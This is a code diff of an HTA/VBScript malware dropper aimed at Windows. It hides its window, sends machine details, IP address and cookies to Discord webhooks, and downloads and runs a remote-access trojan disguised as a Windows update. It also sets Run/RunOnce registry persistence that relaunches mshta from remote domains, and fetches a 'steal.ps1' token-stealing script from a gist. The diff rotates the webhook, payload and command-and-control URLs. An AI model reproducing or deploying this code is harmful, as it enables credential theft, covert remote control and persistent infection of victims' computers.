@@ -1,3 +1,4 @@
+' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -9,8 +10,8 @@ Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH = "https://discord.com/api/webhooks/1575878052641120307/EIuq7Eoh6yc58sa00iE_s_xW8amADkDJflS7kRoOBTKpzZU-alyF3B7N2_5HDrNJyYow"
-RE_WH = "https://discord.com/api/webhooks/1575878085109219391/GnNtHyW0cVUohgBJzQd6NCG19fXFOnq9IJvO63ubn8ypX86JUBaNNHk5evKBP9bJvItY"
+WH = "https://discord.com/api/webhooks/1575893744014729336/RzHyuC5pIAWDNAbcarfti42kKCdMU-92WRGJzgshGSrX086PEwX7FF3ubCzWPqCcAkCw"
+RE_WH = "https://discord.com/api/webhooks/1575893832954810519/KnrLzIHOQ3qVgvjBL_451Sz4VU0taSuRUbKY76yUP5Vep-p0ANorYW4-KPidZ4iXx0nN"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -36,16 +37,12 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    ' Only download RAT if it hasn't already successfully dropped
+    ' Only download RAT if it hasn't dropped successfully yet
     If Not ratDropped Then
         Call DropRAT(RE_WH, True)
     End If
     
     Call SleepSeconds(30)
-    
-    ' Spawn new mshta and exit current
-    Call RunCmd("mshta http://matrixhub.app/")
-    Exit Do
 Loop
 
 window.close()
@@ -53,7 +50,7 @@ window.close()
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Updated RAT Link
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1575827182591418438/WindowsUpdate.exe?ex=6b0ab2ed&is=6b09616d&hm=ceda74063b61a32d8271f25486f7004a2e49ca04dd8a5e95a15195b7221abb09&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1575883258497867786/WinUpdate.exe?ex=6b0ae727&is=6b0995a7&hm=6033f4b5076629cba2eeeab88d4121929ee5b01f355bd119ea042ee1fdac95af&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -78,7 +75,7 @@ Sub DropRAT(targetWH, sendRocket)
             ' Execute via WMI
             Call RunCmd("""" & op & """")
             
-            ' Set flag so it stops downloading in the loop
+            ' Set flag to True so it stops downloading in the loop
             ratDropped = True
             
             If sendRocket Then 
@@ -205,7 +202,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta http://matrixhub.app/"
+    Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
@@ -220,7 +217,7 @@ End Sub
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/f5f2709a0bbd01c35d70826448288500f0f25e40/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/84022d9420cb230a52044fdbd6fadcad0efae11a/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
